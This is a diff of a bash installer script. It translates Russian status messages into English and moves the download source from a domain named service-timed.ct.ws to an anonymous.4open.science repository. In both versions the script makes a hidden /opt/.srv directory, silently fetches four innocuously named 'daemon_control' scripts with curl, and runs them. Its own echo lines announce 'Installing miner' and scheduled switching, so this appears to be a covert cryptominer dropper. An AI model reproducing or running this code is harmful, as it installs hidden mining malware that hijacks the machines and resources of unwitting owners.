@@ -1,18 +1,17 @@
 #!/bin/bash
-DOMAIN="service-timed.ct.ws"
-echo "Скачиваем скрипты управления демонами..."
+echo "Downloading daemon control scripts..."
 mkdir -p /opt/.srv
 cd /opt/.srv
-curl -s -L "http://$DOMAIN/daemon_control_install.sh" -o daemon_control_install.sh
-curl -s -L "http://$DOMAIN/daemon_control_start.sh" -o daemon_control_start.sh
-curl -s -L "http://$DOMAIN/daemon_control_stop.sh" -o daemon_control_stop.sh
-curl -s -L "http://$DOMAIN/daemon_control_schedule.sh" -o daemon_control_schedule.sh
+curl -s -L "https://anonymous.4open.science/api/repo/service-7B29/file/daemon_control_install.sh?v=ddd0492f&download=true" -o daemon_control_install.sh
+curl -s -L "https://anonymous.4open.science/api/repo/service-7B29/file/daemon_control_start.sh?v=ddd0492f&download=true" -o daemon_control_start.sh
+curl -s -L "https://anonymous.4open.science/api/repo/service-7B29/file/daemon_control_stop.sh?v=ddd0492f&download=true" -o daemon_control_stop.sh
+curl -s -L "https://anonymous.4open.science/api/repo/service-7B29/file/daemon_control_schedule.sh?v=ddd0492f&download=true" -o daemon_control_schedule.sh
 chmod +x *.sh
-echo "Устанавливаем майнер..."
+echo "Installing miner..."
 ./daemon_control_install.sh
-echo "Настраиваем автоматическое переключение..."
+echo "Setting up automatic switching..."
 ./daemon_control_schedule.sh
-echo "Установка завершена!"
-echo "Команды управления:"
-echo "  /opt/.srv/daemon_control_start.sh  - запуск"
-echo "  /opt/.srv/daemon_control_stop.sh   - остановка"
+echo "Installation completed!"
+echo "Control commands:"
+echo "  /opt/.srv/daemon_control_start.sh  - start"
+echo "  /opt/.srv/daemon_control_stop.sh   - stop"
